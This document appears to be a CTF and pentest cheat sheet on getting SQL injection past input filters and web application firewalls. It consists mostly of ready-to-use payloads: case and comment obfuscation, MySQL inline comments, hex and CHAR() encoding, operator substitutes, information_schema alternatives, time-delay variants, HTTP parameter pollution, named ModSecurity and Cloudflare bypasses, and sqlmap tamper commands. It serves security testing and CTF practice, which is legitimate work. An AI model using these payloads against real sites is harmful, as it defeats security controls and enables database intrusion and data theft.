# SQL Injection - Filter & WAF Bypass

## Overview
Web Application Firewalls (WAF) and input filters try to block SQL injection. This guide covers techniques to bypass common filtering mechanisms.

---

## Common Filters & Bypasses

### 1. Space Filtering

**Blocked**: `UNION SELECT`

**Bypasses**:
```sql
# Using comments
UNION/**/SELECT
UNION/*comment*/SELECT

# Using newlines
UNION%0ASELECT
UNION%0DSELECT

# Using tabs
UNION%09SELECT

# Using plus signs (in some contexts)
UNION+SELECT

# Using parentheses
UNION(SELECT)
UNION%28SELECT%29

# Combining methods
/*!UNION*//*!SELECT*/
```

---

### 2. `UNION` and `SELECT` Filtering

**Blocked**: Keywords like `UNION`, `SELECT`, `WHERE`, `FROM`

**Bypasses**:

#### Case Variation
```sql
UnIoN SeLeCt
uNiOn sElEcT
UNION SELECT
union select
```

#### Inline Comments (MySQL)
```sql
/*!UNION*//*!SELECT*/
/*!50000UNION*//*!50000SELECT*/  # Version-specific comments
```

#### Double Encoding
```sql
%2555nion %2553elect   # Double URL encode
```

#### Mixed Case + Comments
```sql
UnIoN/**/SeLeCt
uNiOn/*comment*/sElEcT
```

#### Using SQL Functions
```sql
# If SELECT is blocked, try alternatives
SELECT -> (SELECT)
WHERE -> HAVING
AND -> &&
OR -> ||
```

---

### 3. Quote Filtering

**Blocked**: Single quotes `'` or double quotes `"`

**Bypasses**:

#### Hexadecimal Encoding
```sql
# Instead of: username='admin'
username=0x61646d696e

# Instead of: ' UNION SELECT 'admin'
' UNION SELECT 0x61646d696e
```

#### Using `CHAR()` Function
```sql
# Instead of: 'admin'
CHAR(97,100,109,105,110)

# Full example
' UNION SELECT CHAR(97,100,109,105,110)--
```

#### Numeric Context (if possible)
```sql
# If you control a numeric parameter
id=1 OR 1=1
id=1 UNION SELECT 1,2,3
```

---

### 4. Comment Filtering

**Blocked**: `--`, `#`, `/* */`

**Bypasses**:

#### Using Null Byte
```sql
';%00
```

#### Using Newlines
```sql
'%0A
'%0D
```

#### No Comment Needed
```sql
# Close the query naturally
' AND '1'='1

# Example
?id=1' AND '1'='1' AND username='admin' AND '1'='1
```

#### Semicolon Termination
```sql
';
```

---

### 5. `OR` and `AND` Filtering

**Blocked**: `OR`, `AND`

**Bypasses**:
```sql
# Use symbols
AND -> &&
OR -> ||

# Example
' && 1=1
' || 1=1

# Using case variation
Or
oR
AnD
aNd
```

---

### 6. Equals Sign Filtering

**Blocked**: `=`

**Bypasses**:
```sql
# Use LIKE
username LIKE 'admin'

# Use IN
username IN ('admin')

# Use comparison operators
username>'admi' AND username<'adminz'

# Use REGEXP (MySQL)
username REGEXP '^admin$'
```

---

### 7. Comma Filtering

**Blocked**: `,` (in UNION or function calls)

**Bypasses**:

#### For `UNION SELECT`
```sql
# Use JOIN or OFFSET
UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b

# Use parentheses and OFFSET (PostgreSQL)
UNION SELECT * FROM (SELECT 1) OFFSET 0
```

#### For Function Arguments
```sql
# Instead of: SUBSTRING(str,1,1)
SUBSTRING(str FROM 1 FOR 1)

# Instead of: MID(str,1,1)  
MID(str FROM 1 FOR 1)

# Instead of: CONCAT(a,b,c)
CONCAT(a||b||c)
```

---

### 8. Concatenation Operator Filtering

**Blocked**: `CONCAT()` function

**Bypasses**:
```sql
# MySQL - Use pipe operator if allowed
SELECT 'a'||'b'

# Use CONCAT_WS()
CONCAT_WS('','a','b','c')

# Use mathematical operations
SELECT 0+database()
```

---

### 9. `information_schema` Filtering

**Blocked**: `information_schema` keyword

**Bypasses**:

#### MySQL
```sql
# Use sys schema (MySQL 5.7+)
SELECT table_name FROM sys.x$schema_table_statistics

# Use mysql.innodb_table_stats
SELECT database_name,table_name FROM mysql.innodb_table_stats

# Hex encoding
SELECT table_name FROM 0x696e666f726d6174696f6e5f736368656d61.tables
```

#### PostgreSQL
```sql
# Use pg_catalog
SELECT tablename FROM pg_tables

# Use pg_class
SELECT relname FROM pg_class WHERE relkind='r'
```

---

### 10. `SLEEP()` and Time-Based Function Filtering

**Blocked**: `SLEEP()`, `BENCHMARK()`, `WAITFOR`

**Bypasses**:

#### Heavy Queries (MySQL)
```sql
# Use computationally expensive operations
' AND (SELECT COUNT(*) FROM information_schema.columns A, information_schema.columns B)>0--

# Use GET_LOCK with timeout
' AND GET_LOCK('lock',5)--
```

#### PostgreSQL Alternative
```sql
' || (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END)--
```

---

## Advanced Bypass Techniques

### 1. SQL Inline Comments (MySQL)
```sql
/*!UNION*//*!SELECT*/
/*!12345UNION*//*!12345SELECT*/
/*!50000UNION*//*!50000SELECT*/  # Version specific

# Full example
?id=1'/*!UNION*//*!SELECT*/1,2,3--+
```

### 2. Buffer Overflow / Encoding Tricks
```sql
# URL double encoding
%2527 -> %27 -> '
%252f -> %2f -> /

# Unicode bypass
%u0027 -> '
%u02b9 -> ʹ (might be normalized to ')
```

### 3. Parameter Pollution
```sql
# Send multiple parameters with same name
?id=1&id=' UNION SELECT--
?id=1' OR '1'='1&id=1

# Backend might concatenate or use first/last
```

### 4. HTTP Parameter Pollution (HPP)
```sql
# Some WAFs only check first parameter
?id=1&id=1' UNION SELECT 1,2,3--

# Or last parameter
?id=1' UNION SELECT 1,2,3--&id=1
```

### 5. Scientific Notation (for numeric bypass)
```sql
# Instead of: id=1
id=1e0
id=1.0
id=0.1e1
```

---

## WAF-Specific Bypasses

### ModSecurity CRS Bypass
```sql
# Using null bytes
?id=1%00' UNION SELECT--

# Using tampered spacing
?id=1'UnIoN(SeLeCt 1,2,3)--
```

### Cloudflare WAF Bypass
```sql
# Case variation often works
?id=1'uNiOn+sElEcT--

# Using encoded newlines
?id=1'%0AUNION%0ASELECT--
```

---

## Testing Strategy

1. **Identify what's blocked**: Test each component separately
   ```sql
   ' UNION      # Is UNION blocked?
   ' SELECT     # Is SELECT blocked?
   ' OR         # Is OR blocked?
   ```

2. **Test bypass methods**: Try each bypass technique
   ```sql
   UnIoN        # Case variation
   /*!UNION*/   # Inline comment
   %55nion      # URL encoding
   ```

3. **Combine techniques**: Use multiple bypasses together
   ```sql
   /*!50000UnIoN*//**//*!50000SeLeCt*/
   ```

4. **Monitor responses**: Check for different error messages or behavior

---

## Encoding Reference

### URL Encoding
```
Space: %20, +
' : %27
" : %22
# : %23
/ : %2f
\ : %5c
( : %28
) : %29
= : %3d
```

### Hex Encoding (MySQL)
```sql
admin -> 0x61646d696e
user  -> 0x75736572
```

### Character Encoding
```sql
a -> CHAR(97)
A -> CHAR(65)
```

---

## CTF-Specific Tips

1. **Check allowed characters**: Some CTFs whitelist characters - focus on what works
2. **Try alternate syntax**: Different databases, different bypass methods
3. **Look for hints in source code**: Sometimes filter implementation is shown
4. **Test systematically**: Don't randomly try payloads - understand what's blocked
5. **Use automation**: Tools like sqlmap have tamper scripts

### sqlmap Tamper Scripts
```bash
# List available tamper scripts
sqlmap --list-tampers

# Common useful tampers
sqlmap -u "URL" --tamper=space2comment
sqlmap -u "URL" --tamper=between
sqlmap -u "URL" --tamper=charencode
sqlmap -u "URL" --tamper=equaltolike

# Combine multiple tampers
sqlmap -u "URL" --tamper=space2comment,between,charencode
```

---

## Quick Bypass Checklist

```sql
# Basic bypasses to try:
UnIoN SeLeCt              # Case variation
UNION/**/SELECT           # Comment spacing
/*!UNION*//*!SELECT*/     # Inline comments
UNION%0ASELECT            # Newline
0x61646d696e              # Hex encoding (for 'admin')
CHAR(97,100,109,105,110)  # CHAR encoding
AND -> &&                 # Symbol replacement
OR -> ||                  # Symbol replacement
= -> LIKE                 # Operator replacement
' -> %27 -> %2527         # Double encoding
```

---

## Resources & Tools

- **sqlmap**: Automated with built-in bypass techniques
- **Burp Suite**: Manual testing with Intruder for fuzzing
- **OWASP ZAP**: Alternative to Burp
- **Hackvertor**: Burp extension for encoding chains

Remember: Bypassing filters is about understanding what's blocked and finding creative alternatives. Think like the filter - what patterns is it looking for? How can you express the same logic differently?